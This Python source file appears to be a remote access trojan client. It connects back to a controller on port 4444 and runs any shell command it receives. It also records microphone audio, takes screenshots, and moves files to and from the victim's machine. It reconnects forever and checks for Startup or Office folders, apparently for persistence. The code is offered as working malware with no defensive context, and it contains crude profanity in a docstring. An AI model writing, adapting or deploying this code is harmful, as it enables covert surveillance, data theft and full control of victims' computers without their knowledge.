class Client(object):
    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 4444
        self.socket = None
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return
    def quit_gracefully(self, signal=None, frame=None):
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                pass
        sys.exit(0)
        return
    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            pass
            return
        return
    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except Exception as e:
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except Exception as e:
            raise
        return
    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        return
    def discardAll(self, s):
        """ Helper function specially made for download
        Enjoy Mother Fucker"""
        chunk_bitch = conn.recv(len("File_NotFound"))
        if(chunk_bitch == "File_NotFound".encode()):
           time.sleep(1)
           print(self.socket.send("ok".encode()))
           return
        else:
             print("2")
             while True:
                  if chunk_bitch[-4:] == "sent".encode():
                           break
                  chunk_bitch = s.recv(1024)
                  time.sleep(2)
             self.socket.send("ok".encode())
             return
    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            #print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'':
                pass
            elif data[:2].decode("utf-8") == 'cd':
                 directory = data[3:].decode("utf-8")
                 try:
                   os.chdir(directory.strip())
                 except Exception as e:
                     output_str = "" 
                 else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                time.sleep(10)
                break
            elif len(data) > 0:
                if data.decode("utf-8").split(" ")[0].rstrip() == "record":
                      CHUNK = 1024
                      FORMAT = pyaudio.paInt16
                      CHANNELS = 2
                      RATE = 44100
                      try:
                          RECORD_SECONDS = int(data.decode("utf-8").split(" ")[2].rstrip())
                      except Exception as e:
                          RECORD_SECONDS = 20
                          pass
                      p = pyaudio.PyAudio()
                      stream = p.open(format=FORMAT,
                                      channels=CHANNELS,
                                      rate=RATE,
                                      input=True,
                                      frames_per_buffer=CHUNK)
                      self.socket.send("recording".encode())
                      for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                                      data = stream.read(CHUNK)
                                      self.socket.send(data)
                      self.socket.send("done_recording".encode())
                      stream.stop_stream()
                      stream.close()
                      p.terminate()
                      self.socket.recv(2)
                      time.sleep(2)
                      output_str = ""
                elif data.decode("utf-8").split(" ")[0].rstrip() == "screenshot":
                                 pyautogui.screenshot(str(os.getcwd())+"\\"+str(data.decode("utf-8").split(" ")[1].rstrip())+".png")
                                 f = open (str(data.decode("utf-8").split(" ")[1].rstrip())+".png", "rb")
                                 l = os.path.getsize(str(data.decode("utf-8").split(" ")[1].rstrip())+".png")
                                 m = f.read(l)
                                 self.socket.send("sending".encode())
                                 time.sleep(2)
                                 self.socket.sendall(m+"sent".encode())
                                 self.socket.recv(2)
                                 f.close()
                                 os.remove(data.decode("utf-8").split(" ")[1].rstrip()+".png")
                                 time.sleep(2)
                                 output_str = ""
                elif data.decode("utf-8").split(" ")[0] == "download":
                    try:
                       f = open (str(data.decode("utf-8").split(" ")[1].rstrip()), "rb")
                       l = os.path.getsize(str(data.decode("utf-8").split(" ")[1].rstrip()))
                       m = f.read(l)
                       time.sleep(2)
                       self.socket.sendall(m+"sent".encode())
                       f.close()
                       self.socket.recv(2)
                       time.sleep(2)
                       output_str =""
                    except Exception as e:
                        time.sleep(2)
                        self.socket.send("File_NotFound".encode())
                        self.socket.recv(2)
                        time.sleep(2)
                        output_str = "Nothing Downloaded\n"
                elif data.decode("utf-8").split(" ")[0] == "upload":
                    try:
                        f = open(str(data.decode("utf-8").split(" ")[2].rstrip()),'wb')
                        flag = False
                        text = None
                        while True:
                            m = self.socket.recv(len("File_NotFound"))
                            if( m == "File_NotFound".encode()):
                                    f.close()
                                    os.remove(str(data.decode("utf-8").split(" ")[2].rstrip()))
                                    flag = True
                                    time.sleep(1)
                                    self.socket.send("ok".encode())
                                    break
                            text = m
                            if m:
                               while m:
                                   if(text[-4:] == 'sent'.encode()):
                                          text = text[:-4]
                                          break
                                   m = self.socket.recv(1024)
                                   text += m
                                   
                               break 
                            else:
                                  break
                        if flag:
                             self.print_output("")
                             continue
                        f.write(text)
                        f.close()
                        self.socket.send("ok".encode())
                        time.sleep(2)
                        output_str =""
                    except Exception as e:
                        self.discardAll(self.socket)
                        time.sleep(2)
                        output_str = "Noting uploaded\n"
                else:
                          try:
                             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                             output_bytes = cmd.stdout.read() + cmd.stderr.read()
                             output_str = output_bytes.decode("utf-8", errors="replace")
                          except Exception as e:
                                  output_str = "Command execution unsuccessful: %s\n" %str(e)
            try:
                self.print_output(output_str)
            except Exception as e:
                pass
        self.socket.close()
        return

def main():
    Main_Path = os.getcwd()
    split_Path = Main_Path.split("\\")
    if(split_Path[len(split_Path)-1] == "Office" or split_Path[len(split_Path)-1] == "Startup" or split_Path[len(split_Path)-1] == "Microsoft"):
              client = Client()
              client.register_signal_handler()
              client.socket_create()
              while True:
                     try:
                        client.socket_connect()
                     except Exception as e:
                        time.sleep(5)     
                     else:
                          break    
              try:
                  client.receive_commands()
              except Exception as e:
                       pass
              client.socket.close()
              return
    else:
        client = Client()
        client.register_signal_handler()
        client.socket_create()
        while True:
                     try:
                        client.socket_connect()
                     except Exception as e:
                        time.sleep(5)     
                     else:
                          break    
        try:
             client.receive_commands()
        except Exception as e:
                       pass
        client.socket.close()
        return


if __name__ == '__main__':
    while True:
        main()
